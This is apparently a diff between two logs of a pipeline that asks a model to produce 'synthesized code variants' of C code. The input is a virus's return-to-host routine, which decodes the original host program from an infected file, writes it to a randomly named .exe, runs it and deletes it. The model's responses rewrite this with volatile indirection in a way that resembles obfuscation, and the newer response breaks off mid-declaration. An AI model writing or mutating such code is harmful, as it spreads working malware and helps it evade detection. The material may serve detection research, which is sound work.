@@ -1,11 +1,11 @@
 === META ===
 {
-  "finish_reason": "stop",
+  "finish_reason": "length",
   "attempts": 1,
-  "response_chars": 5725
+  "response_chars": 1821
 }
 
-=== PROMPT (7593 chars) ===
+=== PROMPT (7387 chars) ===
 
         You are an expert C developer generating synthesized code variants.
 
@@ -74,155 +74,151 @@
         - Transform variables strictly according to the selection criteria above, without breaking standard C syntax.
 
         INPUT CODE:
-        #include "data_globals.h"
+        
+#include "data_globals.h"
 #include <windows.h>
 #include <stdint.h>
-#include <stdlib.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
-extern uint32_t _VirusSize;
+extern uint32_t _VirusSize;   /* defined elsewhere */
 
-void _ReturnToHost(LPCSTR param_1)
+void _ReturnToHost(LPCSTR filePath)
 {
-    /* variable declarations (C89 style) */
-    HGLOBAL             hGlobalMemory;
-    const char         *randomChars;
-    HANDLE              hInputFile;
-    DWORD               fileSize;
-    DWORD               bytesRead;
-    DWORD               tickCount;
-    int                 randValue;
-    char                randChar1;
-    char                randChar2;
-    char                randChar3;
-    char                randChar4;
-    char                randChar5;
-    char                outputPath[10];
-    HANDLE              hOutputFile;
-    uint32_t            offset;
-    DWORD               bytesWritten;
-    STARTUPINFOA        si;
+    /* Variable declarations (C89 style) */
+    HGLOBAL hGlobal = NULL;
+    const char *charSet = "AcGh9Kl6";
+    HANDLE hInputFile;
+    DWORD fileSize;
+    DWORD bytesRead;
+    HANDLE hOutputFile;
+    DWORD bytesWritten;
+    DWORD tickCount;
+    int randVal;
+    char ch1, ch2, ch3, ch4, ch5;
+    char exePath[12];
+    uint32_t offset;
+    STARTUPINFOA si;
     PROCESS_INFORMATION pi;
 
-    /* initialization */
-    hGlobalMemory = (HGLOBAL)0;
-    randomChars   = "AcGh9Kl6";
-
-    hInputFile = CreateFileA(param_1,
+    /* Open the input file */
+    hInputFile = CreateFileA(filePath,
                              GENERIC_READ,
                              FILE_SHARE_READ,
                              (LPSECURITY_ATTRIBUTES)0,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              (HANDLE)0);
-    if (hInputFile == INVALID_HANDLE_VALUE) {
+    if (hInputFile == (HANDLE)INVALID_HANDLE_VALUE) {
         ExitProcess(0);
     }
 
+    /* Get its size and allocate a buffer */
     fileSize = GetFileSize(hInputFile, (LPDWORD)0);
-    hGlobalMemory = GlobalAlloc(GMEM_MOVEABLE, fileSize);
-    if (hGlobalMemory == (HGLOBAL)0) {
-        CloseHandle(hInputFile);
+    hGlobal = GlobalAlloc(GMEM_MOVEABLE, fileSize);
+    if (hGlobal == NULL) {
         ExitProcess(0);
     }
 
-    ReadFile(hInputFile, hGlobalMemory, fileSize, &bytesRead, (LPOVERLAPPED)0);
+    /* Read the whole file into the buffer */
+    ReadFile(hInputFile, hGlobal, fileSize, &bytesRead, (LPOVERLAPPED)0);
     CloseHandle(hInputFile);
 
+    /* Generate a random executable name */
     tickCount = GetTickCount();
     srand(tickCount);
 
-    randValue = rand();
-    randChar1 = randomChars[randValue % 8];
-    randValue = rand();
-    randChar2 = randomChars[randValue % 8];
-    randValue = rand();
-    randChar3 = randomChars[randValue % 8];
-    randValue = rand();
-    randChar4 = randomChars[randValue % 8];
-    randValue = rand();
-    randChar5 = randomChars[randValue % 8];
-    randValue = rand();
+    randVal = rand();
+    ch1 = charSet[randVal % 8];
+    randVal = rand();
+    ch2 = charSet[randVal % 8];
+    randVal = rand();
+    ch3 = charSet[randVal % 8];
+    randVal = rand();
+    ch4 = charSet[randVal % 8];
+    randVal = rand();
+    ch5 = charSet[randVal % 8];
+    randVal = rand();
 
-    /* FIX: use snprintf to avoid any chance of overflow. */
-    snprintf(outputPath, sizeof(outputPath),
+    _sprintf(exePath,
              "%c%c%c%c%c%c.exe",
-             (int)randomChars[randValue % 8],
-             (int)randChar5,
-             (int)randChar4,
-             (int)randChar3,
-             (int)randChar2,
-             (int)randChar1);
+             (int)charSet[randVal % 8],
+             (int)ch5,
+             (int)ch4,
+             (int)ch3,
+             (int)ch2,
+             (int)ch1);
 
-    hOutputFile = CreateFileA(outputPath,
+    /* Create the output file */
+    hOutputFile = CreateFileA(exePath,
                               GENERIC_WRITE,
                               FILE_SHARE_WRITE,
                               (LPSECURITY_ATTRIBUTES)0,
                               CREATE_ALWAYS,
-                              FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
+                              FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
                               (HANDLE)0);
-
-    if (hOutputFile != INVALID_HANDLE_VALUE) {
+    if (hOutputFile != (HANDLE)INVALID_HANDLE_VALUE) {
+        /* Encrypt the payload part of the buffer */
         for (offset = _VirusSize; offset < fileSize; ++offset) {
-            ((uint8_t *)hGlobalMemory)[offset] ^= 0x4A;
+            *((uint8_t *)((uintptr_t)hGlobal + offset)) ^= 0x4A;
         }
 
+        /* Write the encrypted payload to the new file */
         SetFilePointer(hOutputFile, 0, (PLONG)0, FILE_BEGIN);
         WriteFile(hOutputFile,
-                  (LPCVOID)(((uint8_t *)hGlobalMemory) + _VirusSize),
+                  (LPCVOID)((uintptr_t)hGlobal + _VirusSize),
                   fileSize - _VirusSize,
                   &bytesWritten,
                   (LPOVERLAPPED)0);
         CloseHandle(hOutputFile);
-        GlobalFree(hGlobalMemory);
+        GlobalFree(hGlobal);
 
+        /* Launch the newly created executable */
         memset(&si, 0, sizeof(si));
         memset(&pi, 0, sizeof(pi));
-        si.cb          = sizeof(si);
-        si.dwFlags     = STARTF_USESHOWWINDOW;
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_SHOW;
 
         CreateProcessA(NULL,
-                       outputPath,
-                       NULL,
-                       NULL,
+                       exePath,
+                       (LPSECURITY_ATTRIBUTES)0,
+                       (LPSECURITY_ATTRIBUTES)0,
                        FALSE,
                        CREATE_NEW_CONSOLE,
-                       NULL,
+                       (LPVOID)0,
                        NULL,
                        &si,
                        &pi);
         WaitForSingleObject(pi.hProcess, INFINITE);
-        DeleteFileA(outputPath);
+        DeleteFileA(exePath);
         ExitProcess(0);
     }
 }
-
         
 
-=== RESPONSE (5725 chars) ===
+=== RESPONSE (1821 chars) ===
 ```c
 #include "data_globals.h"
 #include <windows.h>
 #include <stdint.h>
-#include <stdlib.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
-extern uint32_t _VirusSize;
+extern uint32_t _VirusSize;   /* defined elsewhere */
 
 #pragma optimize("", off)
-void _ReturnToHost(LPCSTR param_1)
+void _ReturnToHost(LPCSTR filePath)
 {
-    /* transformed variable declarations */
-    volatile HGLOBAL hGlobalMemory_buf[2] = {(HGLOBAL)0, (HGLOBAL)0};
-    volatile HGLOBAL *p_hGlobalMemory = (volatile HGLOBAL *)&hGlobalMemory_buf[0];
+    volatile HGLOBAL hGlobal_buf[2] = {NULL, (HGLOBAL)0};
+    volatile HGLOBAL *p_hGlobal = (volatile HGLOBAL *)&hGlobal_buf[0];
 
-    const char * volatile randomChars_buf[2] = {"AcGh9Kl6", (const char *)0};
-    const char * volatile *p_randomChars = &randomChars_buf[0];
+    const char* volatile charSet_buf[2] = {"AcGh9Kl6", (const char*)0};
+    const char* volatile *p_charSet = &charSet_buf[0];
 
-    volatile HANDLE hInputFile_buf[2] = {(HANDLE)0, (HANDLE)0};
+    volatile HANDLE hInputFile_buf[2] = {0, (HANDLE)0};
     volatile HANDLE *p_hInputFile = (volatile HANDLE *)&hInputFile_buf[0];
 
     volatile DWORD fileSize_buf[2] = {0, (DWORD)0};
@@ -231,134 +227,24 @@ void _ReturnToHost(LPCSTR param_1)
     volatile DWORD bytesRead_buf[2] = {0, (DWORD)0};
     volatile DWORD *p_bytesRead = (volatile DWORD *)&bytesRead_buf[0];
 
-    volatile DWORD tickCount_buf[2] = {0, (DWORD)0};
-    volatile DWORD *p_tickCount = (volatile DWORD *)&tickCount_buf[0];
-
-    volatile int randValue_buf[2] = {0, (int)0};
-    volatile int *p_randValue = (volatile int *)&randValue_buf[0];
-
-    volatile char randChar1_buf[2] = {0, (char)0};
-    volatile char *p_randChar1 = (volatile char *)&randChar1_buf[0];
-
-    volatile char randChar2_buf[2] = {0, (char)0};
-    volatile char *p_randChar2 = (volatile char *)&randChar2_buf[0];
-
-    volatile char randChar3_buf[2] = {0, (char)0};
-    volatile char *p_randChar3 = (volatile char *)&randChar3_buf[0];
-
-    volatile char randChar4_buf[2] = {0, (char)0};
-    volatile char *p_randChar4 = (volatile char *)&randChar4_buf[0];
-
-    volatile char randChar5_buf[2] = {0, (char)0};
-    volatile char *p_randChar5 = (volatile char *)&randChar5_buf[0];
-
-    char outputPath[10];
-
-    volatile HANDLE hOutputFile_buf[2] = {(HANDLE)0, (HANDLE)0};
+    volatile HANDLE hOutputFile_buf[2] = {0, (HANDLE)0};
     volatile HANDLE *p_hOutputFile = (volatile HANDLE *)&hOutputFile_buf[0];
-
-    volatile uint32_t offset_buf[2] = {0, (uint32_t)0};
-    volatile uint32_t *p_offset = (volatile uint32_t *)&offset_buf[0];
 
     volatile DWORD bytesWritten_buf[2] = {0, (DWORD)0};
     volatile DWORD *p_bytesWritten = (volatile DWORD *)&bytesWritten_buf[0];
 
-    STARTUPINFOA        si;
-    PROCESS_INFORMATION pi;
+    volatile DWORD tickCount_buf[2] = {0, (DWORD)0};
+    volatile DWORD *p_tickCount = (volatile DWORD *)&tickCount_buf[0];
 
-    /* initialization */
-    (*p_hGlobalMemory) = (HGLOBAL)0;
-    (*p_randomChars) = "AcGh9Kl6";
+    volatile int randVal_buf[2] = {0, (int)0};
+    volatile int *p_randVal = (volatile int *)&randVal_buf[0];
 
-    (*p_hInputFile) = CreateFileA(param_1,
-                                 GENERIC_READ,
-                                 FILE_SHARE_READ,
-                                 (LPSECURITY_ATTRIBUTES)0,
-                                 OPEN_EXISTING,
-                                 FILE_ATTRIBUTE_NORMAL,
-                                 (HANDLE)0);
-    if ((*p_hInputFile) == INVALID_HANDLE_VALUE) {
-        ExitProcess(0);
-    }
-
-    (*p_fileSize) = GetFileSize((*p_hInputFile), (LPDWORD)0);
-    (*p_hGlobalMemory) = GlobalAlloc(GMEM_MOVEABLE, (*p_fileSize));
-    if ((*p_hGlobalMemory) == (HGLOBAL)0) {
-        CloseHandle((*p_hInputFile));
-        ExitProcess(0);
-    }
-
-    ReadFile((*p_hInputFile), (*p_hGlobalMemory), (*p_fileSize), p_bytesRead, (LPOVERLAPPED)0);
-    CloseHandle((*p_hInputFile));
-
-    (*p_tickCount) = GetTickCount();
-    srand((*p_tickCount));
-
-    (*p_randValue) = rand();
-    (*p_randChar1) = (*p_randomChars)[(*p_randValue) % 8];
-    (*p_randValue) = rand();
-    (*p_randChar2) = (*p_randomChars)[(*p_randValue) % 8];
-    (*p_randValue) = rand();
-    (*p_randChar3) = (*p_randomChars)[(*p_randValue) % 8];
-    (*p_randValue) = rand();
-    (*p_randChar4) = (*p_randomChars)[(*p_randValue) % 8];
-    (*p_randValue) = rand();
-    (*p_randChar5) = (*p_randomChars)[(*p_randValue) % 8];
-    (*p_randValue) = rand();
-
-    /* FIX: use snprintf to avoid any chance of overflow. */
-    snprintf(outputPath, sizeof(outputPath),
-             "%c%c%c%c%c%c.exe",
-             (int)(*p_randomChars)[(*p_randValue) % 8],
-             (int)(*p_randChar5),
-             (int)(*p_randChar4),
-             (int)(*p_randChar3),
-             (int)(*p_randChar2),
-             (int)(*p_randChar1));
-
-    (*p_hOutputFile) = CreateFileA(outputPath,
-                                  GENERIC_WRITE,
-                                  FILE_SHARE_WRITE,
-                                  (LPSECURITY_ATTRIBUTES)0,
-                                  CREATE_ALWAYS,
-                                  FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE,
-                                  (HANDLE)0);
-
-    if ((*p_hOutputFile) != INVALID_HANDLE_VALUE) {
-        (*p_offset) = _VirusSize;
-        for ( ; (*p_offset) < (*p_fileSize); ++(*p_offset)) {
-            ((uint8_t *)(*p_hGlobalMemory))[(*p_offset)] ^= 0x4A;
-        }
-
-        SetFilePointer((*p_hOutputFile), 0, (PLONG)0, FILE_BEGIN);
-        WriteFile((*p_hOutputFile),
-                  (LPCVOID)(((uint8_t *)(*p_hGlobalMemory)) + _VirusSize),
-                  (*p_fileSize) - _VirusSize,
-                  p_bytesWritten,
-                  (LPOVERLAPPED)0);
-        CloseHandle((*p_hOutputFile));
-        GlobalFree((*p_hGlobalMemory));
-
-        memset(&si, 0, sizeof(si));
-        memset(&pi, 0, sizeof(pi));
-        si.cb          = sizeof(si);
-        si.dwFlags     = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_SHOW;
-
-        CreateProcessA(NULL,
-                       outputPath,
-                       NULL,
-                       NULL,
-                       FALSE,
-                       CREATE_NEW_CONSOLE,
-                       NULL,
-                       NULL,
-                       &si,
-                       &pi);
-        WaitForSingleObject(pi.hProcess, INFINITE);
-        DeleteFileA(outputPath);
-        ExitProcess(0);
-    }
-}
-#pragma optimize("", on)
-```
+    volatile char ch1_buf[2] = {0, (char)0};
+    volatile char *p_ch1 = (volatile char *)&ch1_buf[0];
+    volatile char ch2_buf[2] = {0, (char)0};
+    volatile char *p_ch2 = (volatile char *)&ch2_buf[0];
+    volatile char ch3_buf[2] = {0, (char)0};
+    volatile char *p_ch3 = (volatile char *)&ch3_buf[0];
+    volatile char ch4_buf[2] = {0, (char)0};
+    volatile char *p_ch4 = (volatile char *)&ch4_buf[0];
+    volatile char ch
